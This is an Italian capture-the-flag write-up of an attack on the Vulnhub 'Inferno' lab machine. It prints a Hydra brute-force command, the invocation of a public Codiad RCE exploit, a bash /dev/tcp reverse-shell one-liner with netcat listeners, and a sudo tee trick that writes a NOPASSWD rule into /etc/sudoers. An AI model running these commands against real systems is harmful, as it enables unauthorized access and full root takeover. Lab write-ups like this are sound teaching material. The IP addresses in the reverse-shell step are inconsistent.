# INFERNO: UN VIAGGIO ATTRAVERSO LE FASI DELL’ATTACCO

## INTRODUZIONE
Il report fornisce un'analisi dettagliata di una demo in cui è stato simulato un attacco alla macchina virtuale "Inferno" scaricata da Vulnhub Labs. L'obiettivo della dimostrazione era di illustrare praticamente le tecniche di penetration testing e le vulnerabilità comuni nella cybersecurity. "Inferno" è una macchina virtuale progettata per l'apprendimento e la pratica del penetration testing, offrendo un ambiente simulato per sviluppare competenze nel rilevamento e nell'exploit di vulnerabilità informatiche. Dal punto di vista pratico si richiedeva di trovare le due hash keys, una associata all'utente 'user' (contenuta nel file local.txt) e l'altra all'utente 'root' (contenuta nel file proof.txt), presenti nella macchina al fine di acquisire i privilegi di amministratore ('root'). Per eseguire la demo, sono state utilizzate due macchine virtuali: "Kali Linux" e "Inferno", configurate per creare un ambiente di test idoneo.

## RECONNAISSANCE
Ho iniziato individuando su quale indirizzo IP si trovasse la macchina “Inferno”. Dopo di che, cercando tale indirizzo sul browser è apparsa la seguente pagina web statica:

<p align="center">
    <img src="images/paginaStatica.png" alt="Pagina statica ottenuta">
</p>

Ho dunque proseguito raccogliendo i dati preliminari sulla macchina per identificare potenziali punti di ingresso. Le attività principali includevano:

- **Nmap scan**: in particolare ho usato queste due versioni del comando:
  - `nmap 10.0.2.11`: per rilevare gli host, le porte aperte e i servizi in esecuzione sulla macchina target. Risultato: una lunga lista di open ports. Tuttavia, molte di queste sono rabbit holes, ovvero dei falsi positivi. Quindi per ovviare a questo problema è stata eseguita una variante di nmaps:
  - `nmaps -sCV 10.0.2.11 -vv`: per rilevare informazioni aggiuntive come dettagli sull’OS e versioni di servizi permettendo così l’identificazione dei servizi d’interesse per questa simulazione. Risultato: ci sono due porte effettivamente aperte e sono evidenziate nella figura sottostante:

<p align="center">
    <img src="images/porteAperte.png" alt="Porte realmente aperte">
</p>


Successivamente alla fase di enumeration delle porte e dei servizi si è ritenuto necessario enumerare anche le cartelle e i file della web application in ascolto sulla porta 80:
- **Gobuster**: uno strumento di brute force utilizzato per scoprire file e directory nascosti su un server web. Ho utilizzato Gobuster con il comando:
  - `gobuster dir -u 10.0.2.11 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`: specifica il percorso della wordlist da utilizzare per la scansione. La wordlist contiene un elenco di nomi di directory e file comuni che Gobuster proverà a trovare sul server web target.
  Risultato: l'esistenza di una directory denominata ‘/inferno’ che potrebbe indicare un sito web alternativo non immediatamente visibile o linkato dalle pagine principali. Potrebbe quindi contenere file sensibili, moduli di login, o altre risorse che possono essere sfruttate durante un penetration test. È dunque un punto di ingresso potenziale che merita ulteriori indagini.

## INITIAL ACCESS
Tentando di accedere all'indirizzo 10.0.2.11/inferno nel browser, è comparsa una finestra di login che richiedeva l'inserimento di username e password di tipologia Basic Auth, identificando così un possibile punto di ingresso nel server web.

<p align="center">
<img src="images/finestraLogin.png" alt="Finestra di login ottenuta" align="center">
</p>

# CREDENTIAL ACCESS
Per ottenere le credenziali necessarie per accedere alla finestra di login sulla macchina, ho utilizzato:

- **Hydra**: è uno strumento che esegue attacchi di forza bruta sulle credenziali di accesso, testando combinazioni di nomi utente e password per ottenere accesso non autorizzato a sistemi protetti da autenticazione. Per condurre questo tipo di attacco, ho utilizzato la wordlist 'rockyou.txt', nota per contenere milioni di credenziali comuni e spesso utilizzate. Il comando utilizzato è stato il seguente:
  - `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.11 http-get /inferno`
  
  Risultato: username=admin    password=dante1

# FOOTHOLD
In questa fase, ho constatato che, utilizzando le credenziali ottenute, sono riuscita ad accedere alla finestra di login precedentemente visualizzata. Tuttavia, dopo aver inserito le credenziali e confermato l'accesso, è emerso un'altra finestra di login che richiedeva nuovamente l'autenticazione. Questa situazione rappresenta una vulnerabilità poiché le credenziali vengono riutilizzate, aumentando il rischio di accessi non autorizzati.

Successivamente, ho esplorato la possibilità di modificare file .php per ottenere un maggiore controllo sul sistema. Tuttavia, a causa delle restrizioni sui permessi, non ho potuto apportare modifiche ai file identificati. In alternativa, ho analizzato la struttura di uno dei file .php per comprendere meglio l'ambiente di sviluppo utilizzato.

Dopo aver scoperto che il sistema utilizza Codiad, un ambiente di sviluppo integrato (IDE) basato sul web, ho proseguito con una ricerca online per individuare exploit già esistenti per Codiad. Ho trovato un exploit su GitHub all'indirizzo [https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit). In seguito, ho scaricato il file exploit.py e l'ho memorizzato sul desktop della mia macchina Kali.

# EXPLOITATION

Successivamente, ho proceduto con l'esecuzione dei comandi necessari al fine di avere remote code execution. Ho eseguito tre terminali. Nel primo terminale ho eseguito:

- `python2 exploit.py http://admin:dante1@10.0.2.11/inferno/ admin dante1 10.0.2.4 4444 linux`: esegue lo script Python exploit.py, passando parametri essenziali come l'URL al cui interno sono state passate le credenziali di basic auth, le credenziali dell'applicativo Codiad, l'indirizzo ip della mia macchina kali, la porta e il sistema operativo di destinazione.

Nel secondo terminale ho eseguito:

- `nc -lnvp 4445`: avvia netcat in modalità "ascolto" sulla porta TCP 4445. Ciò consente a netcat di accettare connessioni in arrivo su quella porta e di gestire i dati scambiati attraverso la connessione.

Nel terzo terminale, ho eseguito:

- `echo 'bash -c "bash -i >/dev/tcp/10.0.2.11/4445 0>&1 2>&1"' | nc -lnvp 4444`: invia una stringa di comando al terminale tramite netcat, configurando una shell inversa che si connette al server IP con l'indirizzo IP 10.0.2.6 sulla porta 4445.

Risultato: nel terzo terminale dopo aver confermato l’esecuzione del comando con il tasto yes ho ottenuto la reverse shell.
www-data@Inferno:/var/www/html/inferno/components/filemanager$

Questo indica che ho ottenuto accesso al sistema remoto tramite la shell inversa. Attualmente quindi, sto operando nell'ambiente del server remoto sotto l'utente www-data, nella directory /var/www/html/inferno/components/filemanager.

# CREDENTIAL DISCOVERY E LATERAL MOVEMENT 

A questo punto, ho eseguito una serie di comandi per esplorare la struttura del file system, navigare tra le directory e visualizzare il contenuto dei file. Innanzitutto, ho utilizzato il comando `ls` per visualizzare i file e le directory presenti nella directory corrente. Successivamente, ho cambiato directory spostandomi nella directory principale degli utenti, `/home`, con il comando `cd /home`. All'interno di questa directory, ho individuato la directory dell'utente "dante" e mi sono spostato al suo interno utilizzando il comando `cd dante`.

Qui, ho eseguito nuovamente il comando `ls` per esplorare il contenuto della directory "dante" e qui ho trovato il documento `local.txt` ma provando ad eseguirlo ho ottenuto come risposta “Permission denied” in quanto non ho i privilegi necessari. Successivamente ho utilizzato il comando `ls -lah` per ottenere un elenco dettagliato, inclusi i file e le directory nascoste nella directory dante. Dopo aver esplorato questa directory, mi sono spostata nella directory "Downloads" utilizzando il comando `cd /home/dante/Downloads/`, dove ho eseguito ulteriori esplorazioni utilizzando ancora una volta il comando `ls -lah`.

Tra i file presenti, ho notato un file chiamato `.download.dat`. Per visualizzare il contenuto di questo documento, ho utilizzato il comando `cat .download.dat`, che ha restituito un risultato codificato in base64. Per decodificare il contenuto e visualizzarlo in chiaro, ho utilizzato il tool "Cyberchef”, uno strumento di decodifica avanzato utilizzato per convertire e visualizzare contenuti codificati in chiaro in modo rapido ed efficiente. 

<p align="center">
    <img src="images/cyberchef.png" alt="Risultato decodifica Cyberchef">
</p>

Alla fine del messaggio decodificato è stato rivelato un nome utente e una password in chiaro ovvero:
username=dante password=V1rg1l10h3lpm3


# PRIVILEGE ESCALATION

Dopo aver trovato le credenziali, ho aperto un nuovo terminale e ho tentato di avviare una sessione SSH (Secure Shell) con l'host remoto specificato dall'indirizzo IP 10.0.2.11, utilizzando il comando: 
- `ssh dante@10.0.2.11`

Questo comando stabilisce una connessione crittografata con l'host remoto utilizzando l'account utente "dante". Successivamente, mi è stata richiesta la password dell'account "dante" per autenticarmi e accedere all'host remoto tramite SSH. Una volta autenticata con successo, sono stata connessa all'host remoto e ho ottenuto l'accesso alla sua shell per eseguire comandi e interagire con il sistema.

Dopo aver autenticato l'accesso tramite SSH, ho provato a fare di nuovo un po’ di esplorazione e ho trovato la prima flag all'interno del documento `local.txt` nella home di dante:

<p align="center">
    <img src="images/contenutoLocal.png" alt="Prima hash key trovata">
</p>


A questo punto, ho tentato una privilege escalation. Innanzitutto, ho utilizzato il comando `sudo -l`, che elenca i comandi specifici che l'utente "dante" è autorizzato ad eseguire con sudo, insieme ai relativi argomenti, se presenti. Il risultato è stato il seguente: `(root) NOPASSWD: /usr/bin/tee`, dove `tee` è un comando utilizzato in sistemi operativi Unix-like e Linux per leggere da standard input e scrivere il contenuto su standard output e su uno o più file.

Successivamente, ho utilizzato il sito web "GTFObins", che ospita una vasta raccolta di tecniche e comandi per ottenere privilegi elevati su sistemi Unix-like e Linux. Dopo aver cercato il comando "tee", ho trovato i seguenti comandi per eseguire una privilege escalation:

- `LFILE=/etc/sudoers`
- `echo "dante ALL=(ALL) NOPASSWD:ALL" | sudo tee -a "$LFILE"`
Il primo comando definisce una variabile di shell chiamata "LFILE" e le assegna il valore “/etc/sudoers”, che è il percorso del file sudoers contenente le regole di autorizzazione per l'uso del comando sudo nel sistema. Il secondo comando invece, aggiunge la linea “dante ALL=(ALL) NOPASSWD” al file "/etc/sudoers", consentendo all'utente "dante" di eseguire qualsiasi comando con sudo senza richiedere una password.

Successivamente, ho utilizzato il comando `sudo bash -p` per avviare una nuova shell interattiva con i privilegi di root. Poiché l'utente "dante" ha ottenuto i privilegi di sudo senza richiesta di password nella fase precedente, questa nuova shell ha i pieni privilegi di root. Utilizzando il comando `cd /root`, sono passata alla directory "/root", ovvero la directory home dell'utente root. Dopodiché, ho utilizzato il comando `ls` per visualizzare tutti i file e le directory presenti in "/root" e ho notato la presenza della seconda e ultima flag "proof.txt".

Infine, ho provato a visualizzare il contenuto di questo file con `cat proof.txt` e ho ottenuto la prova che sono riuscita ad ottenere il controllo totale della macchina Inferno.

<p align="center">
    <img src="images/contenutoProof.png" alt="Seconda hash key trovata">
</p>


## CONCLUSIONE

La dimostrazione ha fornito un'analisi dettagliata e approfondita di un attacco simulato alla macchina virtuale "Inferno" di Vulnhub, concentrandosi sulle tecniche di penetration testing e sulle vulnerabilità comuni affrontate nel contesto della cybersecurity.

Attraverso una serie di fasi ben definite, abbiamo illustrato il ciclo completo di un attacco informatico, partendo dalla fase di reconnaissance, dove sono stati identificati potenziali punti di ingresso e scoperti servizi esposti sulla macchina target. Successivamente, durante la fase di initial access, abbiamo ottenuto le credenziali di accesso utilizzando attacchi di brute force e abbiamo iniziato a esplorare il sistema.

A seguire, abbiamo scoperto una vulnerabilità di riutilizzo delle credenziali, che ci ha permesso di superare ulteriori livelli di autenticazione e ottenere un maggiore controllo sul sistema. Utilizzando un exploit per Codiad, abbiamo avuto remote code execution, ottenendo l'accesso alla shell del server remoto.

Dopo aver esplorato il file system e scoperto ulteriori credenziali, abbiamo eseguito un processo di privilege escalation, ottenendo privilegi di root e dimostrando il totale controllo sulla macchina "Inferno".

Infine, per avere un quadro completo delle vulnerabilità riscontrate, nella lista seguente sono elencate le diverse vulnerabilità, con i link alle rispettive pagine CWE e i relativi CVSS base scores:
- **Credential Stuffing:** [https://capec.mitre.org/data/definitions/600.html](https://capec.mitre.org/data/definitions/600.html)
  - Severity media: **6.5** : [AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&version=3.1)

- **Code Injection:** [https://owasp.org/www-community/attacks/Code_Injection](https://owasp.org/www-community/attacks/Code_Injection)
  - Severity alta: **8.0** : [AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H&version=3.1)

- **Hardcoded Password:** [https://cwe.mitre.org/data/definitions/259.html](https://cwe.mitre.org/data/definitions/259.html)
  - Severity media: **6.6** : [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L&version=3.1)

- **Sudo Misconfiguration:** [https://cwe.mitre.org/data/definitions/250.html](https://cwe.mitre.org/data/definitions/250.html)
  - Severity alta: **7.8** : [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H&version=3.1)




## REFERENZE

[1] Vulnhub Labs, "Inferno", creata da Mindsflee, 6 dicembre 2020. [Online]. Disponibile: [https://www.vulnhub.com/?q=inferno](https://www.vulnhub.com/?q=inferno)

[2] Y. Wang, "Codiad Remote Code Execution Exploit", 2019. [Online]. Disponibile: [https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit)

[3] GCHQ, "CyberChef". [Online]. Disponibile: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

[4] GTFOBins, "GTFOBins". [Online]. Disponibile: [https://gtfobins.github.io/](https://gtfobins.github.io/)

[5] NVD, "CVSS v3.1 Base Score Calculator". [Online]. Disponibile: [https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)

[6] TryHackMe, "Inferno", creata da Mindsflee, 12 febbraio 2021. [Online]. Disponibile: [https://tryhackme.com/r/room/inferno](https://tryhackme.com/r/room/inferno)


 



